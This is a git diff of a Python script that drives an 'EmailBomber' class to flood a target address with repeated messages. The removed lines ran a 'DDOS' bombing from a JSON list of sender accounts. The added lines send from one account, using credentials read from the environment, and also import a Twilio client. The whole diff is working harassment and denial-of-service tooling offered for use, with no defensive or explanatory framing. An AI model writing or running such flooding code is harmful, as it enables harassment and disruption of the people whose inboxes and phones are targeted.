@@ -7,12 +7,14 @@ import json
 from bombers import EmailBomber
 
 
+from twilio.rest import Client
+
+
 def main():
-	with open('../DDOS.json', 'r') as file:
-		json_text = file.read()
-		data = json.loads(json_text)
-	email_bomber = EmailBomber(os.environ["RECEIVER_EMAIL"], "Привет мир", msg=["Привет Мир", "Gh", "Hg"], is_html=True, min_interval=2, max_interval=5)
-	email_bomber.start_DDOS_bombing(data['emails'])
+	email_bomber = EmailBomber(os.environ["RECEIVER_EMAIL"], "Привет мир", msg="Hello", min_interval=5, max_interval=5)
+	email_bomber.start_bombing(os.environ['SENDER_EMAIL'], os.environ['SENDER_EMAIL_PASSWORD'])
+
+
 
 if __name__ == '__main__':
 	load_dotenv('../.env')
